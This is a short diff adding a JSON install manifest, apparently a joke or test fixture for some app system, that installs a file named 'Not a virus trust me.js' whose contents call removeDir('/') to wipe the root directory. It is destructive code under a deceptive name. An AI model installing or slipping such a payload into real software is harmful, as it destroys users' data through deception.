@@ -1,0 +1,4 @@
+{
+  "installTo":"/apps/Not a virus trust me.js",
+  "contents":"import { removeDir } from \"/system/important/fs.js\"\nremoveDir('/')"
+}
